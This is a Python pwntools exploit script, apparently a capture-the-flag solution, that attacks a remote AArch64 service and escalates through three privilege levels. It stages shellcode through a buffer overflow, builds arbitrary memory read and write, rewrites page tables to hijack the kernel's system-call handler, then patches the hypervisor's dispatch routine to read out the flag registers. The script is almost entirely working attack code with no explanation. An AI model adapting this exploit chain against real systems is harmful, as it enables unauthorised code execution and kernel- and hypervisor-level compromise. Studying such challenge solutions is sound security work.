#!/usr/bin/env python
from pwn import *
context.update(arch='aarch64', os='linux')
p, u = pack, unpack

from functools import wraps
import cPickle as pickle
import atexit

try:
  func_cache = pickle.load(open('cache.pickle'))
except:
  func_cache = {}

def cached(func):
  @wraps(func)
  def wrapper(*args):
    if func.__name__ not in func_cache:
      func_cache[func.__name__] = {}
    try:
      return func_cache[func.__name__][args]
    except KeyError:
      result = func_cache[func.__name__][args] = func(*args)
      return result 
  return wrapper

def write_cache():
  pickle.dump(func_cache, open('cache.pickle', 'w'))
atexit.register(write_cache)

conn = remote('52.195.11.111', 6666)

def stage_el0_restricted(shellcode):
  assert '\n' not in shellcode
  assert '\r' not in shellcode
  assert ' ' not in shellcode
  assert '\x00' not in shellcode
  assert len(shellcode) < 256 - 8 - 2

  elf_mprotect = 0x401B68
  elf_printf = 0x400C78

  elf_buf = 0x7ffeffffd000

  conn.recvuntil('cmd> ')
  conn.sendline('1')

  conn.recvuntil('index: ')
  conn.sendline('4096')

  conn.recvuntil('key: ')
  conn.sendline('AAAAAAAA' + shellcode + '\x00')

  # overwrite cmd with elf_buf & mprotect, then:
  # cmd: 1
  # idx: 0x1000
  # key: 12345
  # this runs mprotect(buf, 0x1000, 5)
  conn.recvuntil('cmd> ')
  conn.sendline('1')

  conn.recvuntil('index: ')
  conn.sendline('4096')

  conn.recvuntil('key: ')
  conn.sendline('12345'.ljust(256, '\x00') + p(elf_buf+8) + p(elf_mprotect))

  # Now, we run the elf_buf.
  # cmd: 0
  # idx: anything
  # this runs buf(buf, anything, 0)
  conn.recvuntil('cmd> ')
  conn.sendline('0')

  conn.recvuntil('index: ')
  conn.sendline('0')

def stage_el0(shellcode):
  '''0x1000 bytes of arbitrary shellcode in el0. 0x1000 could be raised, if needed.'''
  # 401B5C mmap          mmap(0LL, (size_t)v4, 3, 0, 0, -1LL);
  # 401B50 read          read(0, &c, 1uLL)
  # 401B68 mprotect
  stager = r'''
mov x19, #0x0401
lsl x19, x19, #12
sub x20, x20, x20
mov x23, #0x1111
lsr x23, x23, #12
lsl x23, x23, #12

mov x0, x20
mov x1, x23
mov x2, #0x310
lsr x2, x2, #8
mov x3, x20
mov x4, x20
neg x5, x20
add x10, x19, #0xb5c
blr x10
add x21, x0, #123
sub x21, x21, #123

mov x22, x23
readloop:
  sub x22, x22, #0x111
  add x22, x22, #0x110
  mov x0, x20
  add x1, x21, x22
  lsr x2, x23, #12
  add x10, x19, #0xb50
  blr x10
  cmp x22, x20
  bne readloop

mov x0, x21
mov x1, x23
mov x2, #0x510
lsr x2, x2, #8
add x10, x19, #0xb68
blr x10
blr x21
  '''
  stage_el0_restricted(asm(stager))
  conn.send(shellcode.ljust(0x1000)[::-1])

lib = r'''
next_stage:
  adr x19, .
  and x19, x19, #0xfff000
  eor x19, x19, #0x1000

  mov x0, x19
  mov x1, #0x1000
  mov x2, #PROT_WRITE
  bl mprotect

  mov x1, x19
  mov x2, #0x1000
  bl readloop

  mov x0, x19
  mov x1, #0x1000
  mov x2, #PROT_EXEC
  bl mprotect

  br x19

readloop:
  stp x29, x30, [sp, -0x10]!
loop:
  cbz x2, done
  bl read
  add x1, x1, #1
  sub x2, x2, #1
  b loop
done:
  ldp x29, x30, [sp], #0x10
  ret

read:
  mov x8, #__NR_read
  svc 0
  ret

write:
  mov x8, #__NR_write
  svc 0
  ret

mmap:
  mov x8, #__NR_mmap
  svc 0
  ret

mprotect:
  mov x8, #__NR_mprotect
  svc 0
  ret

exit:
  mov x8, #__NR_exit
  svc 0
  ret
'''

stage2 = r'''
ldr x0, =0x400000
ldr x1, =0x2000
mov x2, #PROT_WRITE
bl mprotect

ldr x1, =0x400000
mov x2, #0x1000
bl readloop

ldr x0, =0x400000
ldr x1, =0x1000
mov x2, #PROT_EXEC
bl mprotect

ldr x0, =0x400000
br x0
''' + lib

PROT_WRITE = 2
PROT_EXEC = 4

stage_el0(asm(stage2))

@cached
def read(addr, n):
  code = r'''
    ldr x1, =0x%x
    mov x2, #0x%x
    bl write
    b next_stage
  ''' % (addr, n) + lib
  conn.send(asm(code).ljust(0x1000))
  data = conn.recvn(n)
  return data

def write(addr, data):
  code = r'''
    ldr x1, =0x%x
    mov x2, #0x%x
    bl readloop
    b next_stage
  ''' % (addr, len(data)) + lib
  conn.send(asm(code).ljust(0x1000))
  conn.send(data)

def mmap(n, prot):
  code = r'''
    mov x0, #0
    mov x1, #0x%x
    mov x2, #0x%x
    bl mmap
    str x0, [sp]
    mov x1, sp
    mov x2, #8
    bl write
    b next_stage
  ''' % (n, prot) + lib
  conn.send(asm(code).ljust(0x1000))
  return u(conn.recvn(8))

def mprotect(addr, n, prot):
  code = r'''
    ldr x0, =0x%x
    ldr x1, =0x%x
    mov x2, #0x%x
    bl mprotect
    b next_stage
  ''' % (addr, n, prot) + lib
  conn.send(asm(code).ljust(0x1000))

el1_svc_handler = 0xFFFFFFFFC0008BA8
svc_handler_offset = el1_svc_handler & 0xfff

kernel_trans_table = u(read(0xFFFFFFFFC002B008, 8))
user_trans_table = u(read(0xFFFFFFFFC001A190, 8)) + 0xFFFFFFFFC0000000

def virt_to_ipa(vaddr):
  if vaddr >> 63:
    #return vaddr - 0xFFFFFFFFC0000000
    trans_table = kernel_trans_table
  else:
    trans_table = user_trans_table
  shift = 39
  for i in xrange(4):
      idx = (vaddr >> shift) & 0x1ff
      trans_table = u(read(trans_table + idx * 8, 8))
      trans_table &= 0xffffffffff000
      trans_table += 0xFFFFFFFFC0000000
      shift -= 9
  return trans_table - 0xFFFFFFFFC0000000

def get_pt(vaddr):
  if vaddr >> 63:
    trans_table = kernel_trans_table
  else:
    trans_table = user_trans_table
  shift = 39
  for i in xrange(3):
    idx = (vaddr >> shift) & 0x1ff
    trans_table = u(read(trans_table + idx * 8, 8))
    trans_table &= 0xffffffffff000
    trans_table += 0xFFFFFFFFC0000000
    shift -= 9
  return trans_table

def map_page(vaddr, paddr, prot):
  if prot & PROT_WRITE:
    flags = 0x20000000000443
  else:
    flags = 0x40000000000483
  pte = p(paddr | flags)
  pt = get_pt(vaddr)
  idx = (vaddr >> 12) & 0x1ff
  write(pt + idx * 8, pte)

klib = r'''
next_stage:
  adr x0, .
  and x0, x0, #0x1000
  eor x0, x0, #0x1000

  ldr x22, =0x30000
  add x22, x22, x0

  ldr x23, =0xFFFFFFFFC0000000
  add x23, x23, x0

  // Writable
  ldr x1, =0x400000000004c3
  mov x0, x22
  bl map_ipa

  mov x1, x23
  mov x2, #0x1000
  bl read

  // Executable
  mov x1, #0x443
  mov x0, x22
  bl map_ipa

  br x23

// map_ipa(ipa, flags)
map_ipa:
  mov x2, x1
  mov x1, x0
  mov x0, #1
  hvc 0
  ret

read:
  stp x29, x30, [sp, -0x10]!
  mov x19, x1
  mov x20, x2
readloop:
  cbz x20, readdone
  bl inchar
  strb w0, [x19]
  add x19, x19, #1
  sub x20, x20, #1
  b readloop
readdone:
  ldp x29, x30, [sp], #0x10
  ret

write:
  stp x29, x30, [sp, -0x10]!
  mov x19, x1
  mov x20, x2
writeloop:
  cbz x20, writedone
  ldrb w0, [x19]
  bl outchar
  add x19, x19, #1
  sub x20, x20, #1
  b writeloop
writedone:
  ldp x29, x30, [sp], #0x10
  ret

inchar:
  ldr x0, =0xFFFFFFFFC0009AD8
  br x0

outchar:
  ldr x9, =0xFFFFFFFFC0009AA4
  br x9

outstr:
  ldr x9, =0xFFFFFFFFC0009400 
  br x9
'''

flag_func = r'''
flag:
  mrs x1, s3_3_c15_c12_0
  str w1, [x0]
  mrs x1, s3_3_c15_c12_1
  str w1, [x0, #4]
  mrs x1, s3_3_c15_c12_2
  str w1, [x0, #8]
  mrs x1, s3_3_c15_c12_3
  str w1, [x0, #12]
  mrs x1, s3_3_c15_c12_4
  str w1, [x0, #16]
  mrs x1, s3_3_c15_c12_5
  str w1, [x0, #20]
  mrs x1, s3_3_c15_c12_6
  str w1, [x0, #24]
  mrs x1, s3_3_c15_c12_7
  str w1, [x0, #28]
  ret
'''

stage3 = mmap(0x1000, PROT_WRITE)
stage3_ipa = virt_to_ipa(stage3)
log.info('stage3_ipa = %s', hex(stage3_ipa))

pt = get_pt(el1_svc_handler)
vector_table_pt = 0x412000
map_page(vector_table_pt, virt_to_ipa(pt), PROT_WRITE)

pte = 0x403 | stage3_ipa
idx = (el1_svc_handler >> 12) & 0x1ff
pte_addr = vector_table_pt + idx * 8

payload = bytearray(read(el1_svc_handler & ~0xfff, 0x1000))
code = asm(r'''
// mov x0, sp
// bl flag
// bl outstr

// Page table
ldr x22, =0x%x

// Map 0x30000-0x32000 RW to 0xFFFFFFFFC0000000.
ldr x1, =0x30403
str x1, [x22]
add x1, x1, #0x1000
add x22, x22, 8
str x1, [x22]

ldr x21, =0xFFFFFFFFC0000000
mov x1, x21
mov x2, #0x1000
bl read

// Make 0x30000 executable.
mov x1, #0x443
ldr x0, =0x30000
bl map_ipa

br x21
''' % pt + flag_func + klib)

payload[svc_handler_offset:svc_handler_offset+len(code)] = code
write(stage3, payload)
mprotect(stage3, 0x1000, PROT_EXEC)

load_stage3 = r'''
  ldr x0, =0x%x
  ldr x1, =0x%x
  str x1, [x0]
  svc 0
''' % (pte_addr, pte)
conn.send(asm(load_stage3).ljust(0x1000))

@cached
def kread(addr, n):
  code = r'''
    ldr x1, =0x%x
    mov x2, #0x%x
    bl write
    b next_stage
  ''' % (addr, n) + klib
  conn.send(asm(code).ljust(0x1000))
  data = conn.recvn(n)
  return data

def kwrite(addr, data):
  code = r'''
    ldr x1, =0x%x
    mov x2, #0x%x
    bl read
    b next_stage
  ''' % (addr, len(data)) + klib
  conn.send(asm(code).ljust(0x1000))
  conn.send(data)

def map_ipa(ipa, flags):
  code = r'''
    ldr x0, =0x%x
    ldr x1, =0x%x
    bl map_ipa
    b next_stage
  ''' % (ipa, flags) + klib
  conn.send(asm(code).ljust(0x1000))

# Map IPA 0x7000 RW to phys addr 0x40107000.
ipa_table_base = 0x40107000
ipa_table_ipa = 0x7000
map_ipa(ipa_table_ipa | 0x80, 0x443 | ipa_table_base)

# Map 0xFFFFFFFFC0002000 to IPA 0x7000.
ipa_table_vaddr = 0xFFFFFFFFC0002000
kwrite(pt + 2*8, p(0x403 | ipa_table_ipa))

hvc_dispatch = 0x401003D8

# Map IPA 0 RW to the physical page containing the hvc dispatch function.
kwrite(ipa_table_vaddr, p(0x4c3 | (hvc_dispatch & ~0xfff)))

# Maps 0xFFFFFFFFC0003000 to IPA 0.
phys_vaddr = 0xFFFFFFFFC0003000
kwrite(pt + 3*8, p(0x403))

hvc_dispatch_vaddr = 0xFFFFFFFFC0003000 + (hvc_dispatch & 0xfff)

code = r'''
  ldr x21, =0x%x

  mov x1, x21
  mov x2, #0x100
  bl read

  hvc 0
''' % hvc_dispatch_vaddr + klib
conn.send(asm(code).ljust(0x1000))

hv_code = r'''
  mov x0, sp
  bl flag
  bl outstr

outstr:
  ldr x9, =0x40100A04
  br x9
''' + flag_func
conn.send(asm(hv_code).ljust(0x100))

conn.interactive(prompt='')
